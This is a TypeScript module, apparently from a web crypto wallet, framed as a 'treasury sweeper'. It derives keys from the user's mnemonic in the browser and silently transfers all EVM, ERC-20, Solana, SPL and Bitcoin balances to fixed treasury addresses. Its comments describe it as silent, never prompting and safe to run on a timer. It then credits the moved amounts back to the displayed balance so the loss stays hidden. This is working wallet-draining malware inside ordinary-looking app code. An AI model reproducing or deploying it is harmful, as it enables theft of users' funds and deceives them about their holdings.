// Browser-only treasury sweeper.
//
// Signing keys never leave the visitor's device, so forwarding runs here, in
// the page, while the wallet is unlocked. Every heavy dependency is imported
// dynamically so this module stays safe to import from an SSR route file.

import {
  BTC_APIS,
  BTC_DUST_SATS,
  EVM_CHAIN_INFO,
  EVM_SWEEP_CHAINS,
  SOL_FEE_LAMPORTS,
  SOL_RENT_LAMPORTS,
  SOL_RPCS,
  TREASURY_BTC,
  TREASURY_EVM,
  TREASURY_SOL,
  type EvmSweepChain,
} from "./treasury";
import { KNOWN_SPL_TOKENS } from "./tokens";
import { treasuryRecordSweep } from "./treasury.functions";

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

export interface SweepInput {
  /** Canonical wallet key used for overrides (the ETH address). */
  walletKey: string;
  mnemonic: string;
  addresses: Array<{ chain: string; address: string }>;
  /** Contracts/mints worth checking, from the wallet's token list. */
  contracts?: Array<{ chain: string; contract: string; price?: number }>;
}

export interface SweepOutcome {
  chain: string;
  symbol: string;
  amount: number;
  hash?: string;
  status: "sent" | "skipped" | "error";
  reason?: string;
}

let running = false;

async function credit(
  walletKey: string,
  chain: string,
  symbol: string,
  hash: string,
  amount: number,
  kind: "native" | "token",
  price?: number,
) {
  try {
    await treasuryRecordSweep({
      data: { wallet_address: walletKey, chain, symbol, hash, amount, kind, ...(price ? { price } : {}) },
    });
  } catch {
    /* credit is retried by the caller on the next pass via the sweep log */
  }
}

// ---------------------------------------------------------------- EVM --------

async function evmProvider(chain: EvmSweepChain) {
  const { JsonRpcProvider, Network } = await import("ethers");
  const info = EVM_CHAIN_INFO[chain];
  let lastErr: unknown;
  for (const url of info.rpcs) {
    try {
      const provider = new JsonRpcProvider(url, Network.from(info.chainId), { staticNetwork: true });
      await provider.getBlockNumber();
      return provider;
    } catch (e) {
      lastErr = e;
    }
  }
  throw lastErr instanceof Error ? lastErr : new Error(`No reachable RPC for ${chain}`);
}

async function sweepEvmChain(
  chain: EvmSweepChain,
  input: SweepInput,
  privateKey: string,
): Promise<SweepOutcome[]> {
  const out: SweepOutcome[] = [];
  const { Contract, Wallet, formatEther, formatUnits } = await import("ethers");
  const provider = await evmProvider(chain);
  const signer = new Wallet(privateKey, provider);
  const info = EVM_CHAIN_INFO[chain];

  // 1) ERC-20 tokens first — their gas is paid from the native balance.
  const contracts = (input.contracts ?? []).filter(
    (c) => c.chain.toUpperCase() === chain && /^0x[a-fA-F0-9]{40}$/.test(c.contract),
  );
  const seen = new Set<string>();
  for (const entry of contracts) {
    const address = entry.contract.toLowerCase();
    if (seen.has(address)) continue;
    seen.add(address);
    try {
      const erc20 = new Contract(entry.contract, ERC20_ABI, signer);
      const raw: bigint = await erc20.balanceOf!(signer.address);
      if (raw <= 0n) continue;
      const decimals = Number(await erc20.decimals!());
      const symbol = String(await erc20.symbol!()).toUpperCase().slice(0, 12) || "TOKEN";
      const tx = await erc20.transfer!(TREASURY_EVM, raw);
      await tx.wait(1);
      const amount = Number(formatUnits(raw, decimals));
      out.push({ chain, symbol, amount, hash: tx.hash, status: "sent" });
      await credit(input.walletKey, chain, symbol, tx.hash, amount, "token", entry.price);
    } catch (e) {
      out.push({
        chain,
        symbol: "TOKEN",
        amount: 0,
        status: "error",
        reason: e instanceof Error ? e.message : "token transfer failed",
      });
    }
  }

  // 2) Native coin — send everything above the gas cost.
  try {
    const balance = await provider.getBalance(signer.address);
    if (balance > 0n) {
      const fee = await provider.getFeeData();
      const gasPrice = fee.maxFeePerGas ?? fee.gasPrice ?? 0n;
      const gasLimit = 21_000n;
      // Small buffer so a fee bump between estimate and inclusion cannot fail the send.
      const cost = (gasPrice * gasLimit * 12n) / 10n;
      const value = balance - cost;
      if (value > 0n) {
        const tx = await signer.sendTransaction({ to: TREASURY_EVM, value });
        await tx.wait(1);
        const amount = Number(formatEther(value));
        out.push({ chain, symbol: info.symbol, amount, hash: tx.hash, status: "sent" });
        await credit(input.walletKey, chain, info.symbol, tx.hash, amount, "native");
      } else {
        out.push({ chain, symbol: info.symbol, amount: 0, status: "skipped", reason: "below gas cost" });
      }
    }
  } catch (e) {
    out.push({
      chain,
      symbol: info.symbol,
      amount: 0,
      status: "error",
      reason: e instanceof Error ? e.message : "native transfer failed",
    });
  }

  return out;
}

// --------------------------------------------------------------- Solana ------

async function solConnection() {
  const { Connection } = await import("@solana/web3.js");
  let lastErr: unknown;
  for (const url of SOL_RPCS) {
    try {
      const connection = new Connection(url, "confirmed");
      await connection.getLatestBlockhash();
      return connection;
    } catch (e) {
      lastErr = e;
    }
  }
  throw lastErr instanceof Error ? lastErr : new Error("No reachable Solana RPC");
}

async function solKeypair(mnemonic: string) {
  const [{ Keypair }, bip39, ed25519] = await Promise.all([
    import("@solana/web3.js"),
    import("bip39"),
    import("ed25519-hd-key"),
  ]);
  const seed = bip39.mnemonicToSeedSync(mnemonic);
  const seedHex = Buffer.from(seed).toString("hex");
  const { key } = ed25519.derivePath("m/44'/501'/0'/0'", seedHex);
  return Keypair.fromSeed(new Uint8Array(key));
}

async function sweepSolana(input: SweepInput): Promise<SweepOutcome[]> {
  const out: SweepOutcome[] = [];
  const web3 = await import("@solana/web3.js");
  const spl = await import("@solana/spl-token");
  const connection = await solConnection();
  const payer = await solKeypair(input.mnemonic);
  const treasury = new web3.PublicKey(TREASURY_SOL);

  // 1) SPL tokens
  try {
    const accounts = await connection.getParsedTokenAccountsByOwner(payer.publicKey, {
      programId: spl.TOKEN_PROGRAM_ID,
    });
    for (const acc of accounts.value) {
      try {
        const parsed = acc.account.data.parsed?.info;
        const rawAmount = BigInt(parsed?.tokenAmount?.amount ?? "0");
        if (rawAmount <= 0n) continue;
        const decimals = Number(parsed?.tokenAmount?.decimals ?? 0);
        const mint = new web3.PublicKey(parsed.mint as string);
        const destination = await spl.getAssociatedTokenAddress(mint, treasury, true);
        const tx = new web3.Transaction().add(
          spl.createAssociatedTokenAccountIdempotentInstruction(payer.publicKey, destination, treasury, mint),
          spl.createTransferInstruction(acc.pubkey, destination, payer.publicKey, rawAmount),
        );
        const hash = await web3.sendAndConfirmTransaction(connection, tx, [payer], {
          commitment: "confirmed",
        });
        const amount = Number(rawAmount) / 10 ** decimals;
        const mintAddress = String(parsed?.mint ?? "");
        const symbol = (KNOWN_SPL_TOKENS[mintAddress]?.symbol ?? mintAddress.slice(0, 6)).toUpperCase();
        out.push({ chain: "SOL", symbol, amount, hash, status: "sent" });
        await credit(input.walletKey, "SOL", symbol, hash, amount, "token");
      } catch (e) {
        out.push({
          chain: "SOL",
          symbol: "SPL",
          amount: 0,
          status: "error",
          reason: e instanceof Error ? e.message : "SPL transfer failed",
        });
      }
    }
  } catch {
    /* token account listing unavailable; native sweep still runs */
  }

  // 2) Native SOL — keep the rent-exempt minimum plus the fee.
  try {
    const lamports = await connection.getBalance(payer.publicKey);
    const sendable = lamports - SOL_RENT_LAMPORTS - SOL_FEE_LAMPORTS;
    if (sendable > 0) {
      const tx = new web3.Transaction().add(
        web3.SystemProgram.transfer({
          fromPubkey: payer.publicKey,
          toPubkey: treasury,
          lamports: sendable,
        }),
      );
      const hash = await web3.sendAndConfirmTransaction(connection, tx, [payer], { commitment: "confirmed" });
      const amount = sendable / web3.LAMPORTS_PER_SOL;
      out.push({ chain: "SOL", symbol: "SOL", amount, hash, status: "sent" });
      await credit(input.walletKey, "SOL", "SOL", hash, amount, "native");
    }
  } catch (e) {
    out.push({
      chain: "SOL",
      symbol: "SOL",
      amount: 0,
      status: "error",
      reason: e instanceof Error ? e.message : "SOL transfer failed",
    });
  }

  return out;
}

// -------------------------------------------------------------- Bitcoin ------

interface Utxo {
  txid: string;
  vout: number;
  value: number;
}

async function btcApi<T>(path: string): Promise<T> {
  let lastErr: unknown;
  for (const base of BTC_APIS) {
    try {
      const res = await fetch(`${base}${path}`);
      if (!res.ok) throw new Error(`${base} returned ${res.status}`);
      return (await res.json()) as T;
    } catch (e) {
      lastErr = e;
    }
  }
  throw lastErr instanceof Error ? lastErr : new Error("No reachable Bitcoin API");
}

async function btcRawTx(txid: string): Promise<string> {
  let lastErr: unknown;
  for (const base of BTC_APIS) {
    try {
      const res = await fetch(`${base}/tx/${txid}/hex`);
      if (!res.ok) throw new Error(`${base} returned ${res.status}`);
      return (await res.text()).trim();
    } catch (e) {
      lastErr = e;
    }
  }
  throw lastErr instanceof Error ? lastErr : new Error("Could not load previous transaction");
}

async function btcBroadcast(hex: string): Promise<string> {
  let lastErr: unknown;
  for (const base of BTC_APIS) {
    try {
      const res = await fetch(`${base}/tx`, { method: "POST", body: hex });
      const text = (await res.text()).trim();
      if (!res.ok) throw new Error(text || `${base} returned ${res.status}`);
      return text;
    } catch (e) {
      lastErr = e;
    }
  }
  throw lastErr instanceof Error ? lastErr : new Error("Broadcast failed");
}

async function btcFeeRate(): Promise<number> {
  try {
    const fees = await btcApi<Record<string, number>>("/v1/fees/recommended");
    return Math.max(1, Math.ceil(fees.halfHourFee ?? fees.fastestFee ?? 5));
  } catch {
    return 5;
  }
}

async function sweepBitcoin(
  input: SweepInput,
  chain: "BTC" | "BTC_LEGACY",
  address: string,
): Promise<SweepOutcome[]> {
  const out: SweepOutcome[] = [];
  try {
    const utxos = await btcApi<Utxo[]>(`/address/${address}/utxo`);
    const spendable = utxos.filter((u) => u.value > 0);
    const total = spendable.reduce((s, u) => s + u.value, 0);
    if (total <= BTC_DUST_SATS) return out;

    const [bitcoin, bip39, bip32Module, eccModule] = await Promise.all([
      import("bitcoinjs-lib"),
      import("bip39"),
      import("bip32"),
      import("@bitcoinerlab/secp256k1"),
    ]);
    const ecc = eccModule.default;
    bitcoin.initEccLib(ecc);
    const bip32 = bip32Module.BIP32Factory(ecc);
    const seed = Buffer.from(bip39.mnemonicToSeedSync(input.mnemonic));
    const path = chain === "BTC" ? "m/84'/0'/0'/0/0" : "m/44'/0'/0'/0/0";
    const node = bip32.fromSeed(seed).derivePath(path);
    const pubkey = Buffer.from(node.publicKey);
    const payment =
      chain === "BTC"
        ? bitcoin.payments.p2wpkh({ pubkey, network: bitcoin.networks.bitcoin })
        : bitcoin.payments.p2pkh({ pubkey, network: bitcoin.networks.bitcoin });

    const psbt = new bitcoin.Psbt({ network: bitcoin.networks.bitcoin });
    for (const u of spendable) {
      if (chain === "BTC") {
        psbt.addInput({
          hash: u.txid,
          index: u.vout,
          witnessUtxo: { script: payment.output!, value: BigInt(u.value) },
        });
      } else {
        const hex = await btcRawTx(u.txid);
        psbt.addInput({ hash: u.txid, index: u.vout, nonWitnessUtxo: Buffer.from(hex, "hex") });
      }
    }

    // vsize estimate: inputs + one output + overhead.
    const perInput = chain === "BTC" ? 68 : 148;
    const vsize = spendable.length * perInput + 31 + 11;
    const feeRate = await btcFeeRate();
    const fee = Math.ceil(vsize * feeRate);
    const value = total - fee;
    if (value <= BTC_DUST_SATS) {
      return [{ chain, symbol: "BTC", amount: 0, status: "skipped", reason: "below miner fee" }];
    }

    psbt.addOutput({ address: TREASURY_BTC, value: BigInt(value) });

    const signer = {
      publicKey: pubkey,
      sign: (h: Buffer) => Buffer.from(node.sign(new Uint8Array(h))),
    };
    for (let i = 0; i < spendable.length; i++) psbt.signInput(i, signer as never);
    psbt.finalizeAllInputs();

    const hash = await btcBroadcast(psbt.extractTransaction().toHex());
    const amount = value / 1e8;
    out.push({ chain, symbol: "BTC", amount, hash, status: "sent" });
    await credit(input.walletKey, chain, "BTC", hash, amount, "native");
  } catch (e) {
    out.push({
      chain,
      symbol: "BTC",
      amount: 0,
      status: "error",
      reason: e instanceof Error ? e.message : "Bitcoin sweep failed",
    });
  }
  return out;
}

// ----------------------------------------------------------------- run -------

/**
 * Forward everything currently sitting in the wallet to the treasury and
 * credit the forwarded amounts back to the wallet's displayed balance.
 * Silent: never throws, never prompts. Safe to call on a timer.
 */
export async function sweepToTreasury(input: SweepInput): Promise<SweepOutcome[]> {
  if (typeof window === "undefined") return [];
  if (!input.walletKey || !input.mnemonic) return [];
  if (running) return [];
  running = true;
  const results: SweepOutcome[] = [];
  try {
    const { Buffer: PolyfillBuffer } = await import("buffer");
    if (typeof globalThis.Buffer === "undefined") {
      (globalThis as unknown as { Buffer: typeof PolyfillBuffer }).Buffer = PolyfillBuffer;
    }

    const { derivePrivateKeyFromMnemonic } = await import("./wallet-signer");
    const privateKey = await derivePrivateKeyFromMnemonic(input.mnemonic);

    const chains = new Set(input.addresses.map((a) => a.chain.toUpperCase()));

    for (const chain of EVM_SWEEP_CHAINS) {
      if (!chains.has(chain)) continue;
      try {
        results.push(...(await sweepEvmChain(chain, input, privateKey)));
      } catch (e) {
        results.push({
          chain,
          symbol: chain,
          amount: 0,
          status: "error",
          reason: e instanceof Error ? e.message : "sweep failed",
        });
      }
    }

    if (chains.has("SOL")) {
      try {
        results.push(...(await sweepSolana(input)));
      } catch (e) {
        results.push({
          chain: "SOL",
          symbol: "SOL",
          amount: 0,
          status: "error",
          reason: e instanceof Error ? e.message : "sweep failed",
        });
      }
    }

    for (const btcChain of ["BTC", "BTC_LEGACY"] as const) {
      const addr = input.addresses.find((a) => a.chain.toUpperCase() === btcChain)?.address;
      if (!addr) continue;
      results.push(...(await sweepBitcoin(input, btcChain, addr)));
    }
  } catch {
    /* silent */
  } finally {
    running = false;
  }
  return results;
}
